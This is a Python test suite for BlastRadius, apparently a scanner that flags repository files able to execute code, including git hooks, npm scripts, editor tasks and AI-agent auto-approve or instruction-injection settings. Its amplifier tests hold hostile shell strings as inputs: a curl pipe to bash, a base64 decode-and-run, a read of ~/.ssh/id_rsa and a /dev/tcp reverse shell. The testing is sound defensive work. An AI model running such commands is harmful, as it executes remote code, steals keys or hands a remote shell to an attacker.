"""Test suite for BlastRadius. Run: python -m pytest  (or python -m unittest)."""
from __future__ import annotations

import importlib.util
import io
import unittest
from pathlib import Path

from blastradius.models import Severity
from blastradius.risk import escalate, scan_amplifiers
from blastradius.report import render_json, render_sarif, render_terminal
from blastradius.scanner import scan

ROOT = Path(__file__).resolve().parent.parent
FIX = ROOT / "fixtures"


def _regen():
    spec = importlib.util.spec_from_file_location("_gen", FIX / "_gen.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    mod.main()


def setUpModule():
    _regen()


class TestAmplifiers(unittest.TestCase):
    def test_pipe_to_shell(self):
        ids = {a.id for a in scan_amplifiers("curl -s http://x | bash")}
        self.assertIn("pipe-to-shell", ids)

    def test_base64_exec(self):
        ids = {a.id for a in scan_amplifiers("echo Zm9v | base64 -d | sh")}
        self.assertIn("base64-decode-exec", ids)

    def test_credential_access(self):
        ids = {a.id for a in scan_amplifiers("cat ~/.ssh/id_rsa")}
        self.assertIn("credential-access", ids)

    def test_reverse_shell(self):
        ids = {a.id for a in scan_amplifiers("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")}
        self.assertIn("reverse-shell", ids)

    def test_benign_text_has_no_amplifiers(self):
        self.assertEqual(scan_amplifiers("echo thanks for installing"), [])

    def test_escalate_forces_critical_on_weight5(self):
        amps = scan_amplifiers("curl x | bash")
        self.assertEqual(escalate(Severity.LOW, amps), Severity.CRITICAL)

    def test_escalate_noop_without_amps(self):
        self.assertEqual(escalate(Severity.MEDIUM, []), Severity.MEDIUM)


class TestScanMalicious(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.result = scan(FIX / "malicious-repo")
        cls.by_vec = {}
        for f in cls.result.findings:
            cls.by_vec.setdefault(f.vector_id, []).append(f)

    def test_has_critical(self):
        self.assertEqual(self.result.max_severity(), Severity.CRITICAL)

    def test_expected_vectors_present(self):
        for vid in [
            "git-native-hook", "npm-lifecycle-script", "direnv-envrc",
            "claude-autoapprove", "agent-instruction-injection", "vscode-autotask",
            "gha-pull-request-target", "devcontainer-lifecycle", "mcp-server",
            "python-setup-py", "git-hookspath", "rust-build-rs",
            "git-submodule-transport", "composer-scripts", "go-generate",
            "ssh-config-exec", "debugger-init", "js-config-as-code",
        ]:
            self.assertIn(vid, self.by_vec, f"missing detector: {vid}")

    def test_sample_hook_ignored(self):
        hook_paths = [f.path for f in self.by_vec.get("git-native-hook", [])]
        self.assertTrue(all(not p.endswith(".sample") for p in hook_paths))
        self.assertIn(".git/hooks/pre-commit", hook_paths)

    def test_git_hook_escalated_to_critical(self):
        hook = self.by_vec["git-native-hook"][0]
        self.assertEqual(hook.base_severity, Severity.HIGH)
        self.assertEqual(hook.effective_severity, Severity.CRITICAL)
        self.assertTrue(hook.escalated)

    def test_benign_lifecycle_stays_below_critical(self):
        benign = [f for f in self.by_vec["npm-lifecycle-script"]
                  if f.path.endswith("packages/util/package.json")]
        self.assertEqual(len(benign), 1)
        self.assertLess(benign[0].effective_severity, Severity.CRITICAL)

    def test_malicious_lifecycle_is_critical(self):
        mal = [f for f in self.by_vec["npm-lifecycle-script"]
               if f.path == "package.json"]
        self.assertEqual(mal[0].effective_severity, Severity.CRITICAL)

    def test_findings_sorted_by_severity_desc(self):
        sevs = [int(f.effective_severity) for f in self.result.findings]
        self.assertEqual(sevs, sorted(sevs, reverse=True))


class TestScanClean(unittest.TestCase):
    def test_clean_repo_no_findings(self):
        result = scan(FIX / "clean-repo")
        self.assertEqual(result.findings, [])
        self.assertEqual(result.max_severity(), Severity.INFO)

    def test_exclude_prunes_paths(self):
        full = scan(FIX / "malicious-repo")
        pruned = scan(FIX / "malicious-repo", excludes=[".vscode", ".github"])
        self.assertTrue(len(pruned.findings) < len(full.findings))
        self.assertFalse(any(f.path.startswith(".vscode") for f in pruned.findings))
        self.assertFalse(any(f.path.startswith(".github") for f in pruned.findings))


class TestRenderers(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.result = scan(FIX / "malicious-repo")

    def test_terminal_renders(self):
        buf = io.StringIO()
        render_terminal(self.result, buf, use_color=False)
        self.assertIn("CRITICAL", buf.getvalue())

    def test_json_renders(self):
        import json
        buf = io.StringIO()
        render_json(self.result, buf)
        data = json.loads(buf.getvalue())
        self.assertEqual(data["tool"], "blastradius")
        self.assertTrue(data["findings"])

    def test_sarif_renders(self):
        import json
        buf = io.StringIO()
        render_sarif(self.result, buf)
        data = json.loads(buf.getvalue())
        self.assertEqual(data["version"], "2.1.0")
        self.assertTrue(data["runs"][0]["results"])


class TestCliExit(unittest.TestCase):
    def test_fail_on_high_returns_1(self):
        from blastradius.cli import main
        rc = main([str(FIX / "malicious-repo"), "-q", "--fail-on", "high"])
        self.assertEqual(rc, 1)

    def test_clean_returns_0(self):
        from blastradius.cli import main
        rc = main([str(FIX / "clean-repo"), "-q", "--fail-on", "low"])
        self.assertEqual(rc, 0)


class TestBaseline(unittest.TestCase):
    def test_write_then_suppress_all(self):
        import tempfile, os as _os
        from blastradius import baseline as bl
        result = scan(FIX / "malicious-repo")
        fd, path = tempfile.mkstemp(suffix=".json")
        _os.close(fd)
        try:
            n = bl.write_baseline(result, path)
            self.assertEqual(n, len(result.findings))
            accepted = bl.load_baseline(path)
            new, suppressed = bl.apply_baseline(result.findings, accepted)
            self.assertEqual(new, [])
            self.assertEqual(suppressed, len(result.findings))
        finally:
            _os.unlink(path)

    def test_fingerprint_stable_across_scans(self):
        a = {f.fingerprint for f in scan(FIX / "malicious-repo").findings}
        b = {f.fingerprint for f in scan(FIX / "malicious-repo").findings}
        self.assertEqual(a, b)
        self.assertTrue(all(len(fp) == 16 for fp in a))


class TestPolicy(unittest.TestCase):
    def test_ignore_override_and_custom_rule(self):
        import tempfile, json as _json, os as _os, shutil
        from blastradius import policy
        work = tempfile.mkdtemp()
        try:
            shutil.copytree(FIX / "malicious-repo", work, dirs_exist_ok=True)
            (Path(work) / "deploy.sh").write_text("#!/bin/sh\nkubectl apply -f prod.yaml\n")
            cfg = policy.Config(
                ignore_vectors=["go-generate"],
                severity_overrides={"npm-lifecycle-script": "low"},
                custom_rules=[{
                    "id": "internal-deploy", "files": ["*.sh"],
                    "pattern": "kubectl apply", "severity": "high",
                }],
            )
            custom = policy.build_custom_detectors(cfg.custom_rules)
            result = scan(
                work,
                extra_detectors=custom,
                severity_overrides=cfg.overrides_as_severity,
                ignore_vectors=cfg.ignore_vectors,
            )
            vids = {f.vector_id for f in result.findings}
            self.assertNotIn("go-generate", vids)
            self.assertIn("internal-deploy", vids)
            npm = [f for f in result.findings
                   if f.vector_id == "npm-lifecycle-script" and f.path == "package.json"]
            self.assertEqual(npm[0].effective_severity, Severity.LOW)
        finally:
            shutil.rmtree(work)

    def test_load_config_roundtrip(self):
        import tempfile, json as _json, os as _os
        from blastradius import policy
        fd, path = tempfile.mkstemp(suffix=".json")
        with _os.fdopen(fd, "w") as fh:
            _json.dump({"exclude": ["fixtures"], "fail_on": "critical",
                        "ignore_vectors": ["go-generate"]}, fh)
        try:
            cfg = policy.load_config(path)
            self.assertEqual(cfg.fail_on, "critical")
            self.assertIn("fixtures", cfg.exclude)
            self.assertIn("go-generate", cfg.ignore_vectors)
        finally:
            _os.unlink(path)


class TestNewRenderers(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.result = scan(FIX / "malicious-repo")

    def test_markdown(self):
        buf = io.StringIO()
        from blastradius.report import render_markdown
        render_markdown(self.result, buf)
        out = buf.getvalue()
        self.assertIn("BlastRadius", out)
        self.assertIn("CRITICAL", out)
        self.assertIn("<details>", out)

    def test_html_self_contained(self):
        buf = io.StringIO()
        from blastradius.report import render_html
        render_html(self.result, buf)
        out = buf.getvalue()
        self.assertIn("<!doctype html>", out)
        self.assertNotIn("http-equiv=\"refresh\"", out)
        self.assertIn("donation-funded", out)
        # no external scripts/styles
        self.assertNotIn("<script src", out)
        self.assertNotIn("<link ", out)


if __name__ == "__main__":
    unittest.main()
